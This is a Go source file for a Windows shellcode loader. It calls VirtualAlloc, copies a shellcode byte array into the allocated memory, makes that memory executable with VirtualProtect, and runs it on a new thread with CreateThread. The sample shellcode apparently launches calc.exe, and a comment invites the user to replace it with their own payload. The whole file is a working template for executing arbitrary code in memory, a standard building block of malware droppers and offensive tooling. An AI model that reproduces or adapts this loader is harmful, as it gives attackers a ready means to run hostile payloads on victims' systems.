package main

import (
	"fmt"
	"syscall"
	"unsafe"
)
const (
	// it can be like 0x2000 but itook this from uhh rubyredops cuz i was lazy to find it lol
	MEM_COMMIT = 0x00001000
	MEM_RESERVE = 0x00002000
)
// start calc.exe (Will start calculator.exe), example shellcode, replace with yours
var shellcode = []byte{
	0x50, 0x51, 0x52, 0x53, 0x56, 0x57, 0x55, 0x6A, 0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54,
	0x59, 0x48, 0x83, 0xEC, 0x28, 0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76,
	0x10, 0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C, 0x8B, 0x5C, 0x17,
	0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B, 0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17,
	0x8D, 0x52, 0x02, 0xAD, 0x81, 0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F,
	0x1C, 0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7, 0x48, 0x83, 0xC4,
	0x30, 0x5D, 0x5F, 0x5E, 0x5B, 0x5A, 0x59, 0x58, 0xC3,
}

func main() {
	Kernel32 := syscall.NewLazyDLL("kernel32.dll")
	VirtualAllocation := Kernel32.NewProc("VirtualAlloc")
	VirtualProtect := Kernel32.NewProc("VirtualProtect")
	CreateThread := Kernel32.NewProc("CreateThread")
	WaitForSingleObject := Kernel32.NewProc("WaitForSingleObject")

	addr, _, err := VirtualAllocation.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, syscall.PAGE_READWRITE)
	if addr == 0 {
		fmt.Printf("[!] VirtualAlloc Failed With Error: %v\n", err)
		return
	}
    //copy is like memcpy btw or thats what i think cuz its similar cant lie :shrug:
	copy((*[1 << 30]byte)(unsafe.Pointer(addr))[:], shellcode) 

	var oldprotect uintptr
	ret, _, err := VirtualProtect.Call(addr, uintptr(len(shellcode)), syscall.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldprotect)))
	if ret == 0 {
		fmt.Printf("[!] VirtualProtect Failed With Error: %v\n", err)
		return
	}

	thread, _, err := CreateThread.Call(0, 0, addr, 0, 0, 0)
	if thread == 0 {
		fmt.Printf("[!] CreateThread Failed With Error: %v\n", err)
		return
	}

	WaitForSingleObject.Call(thread, syscall.INFINITE)
}
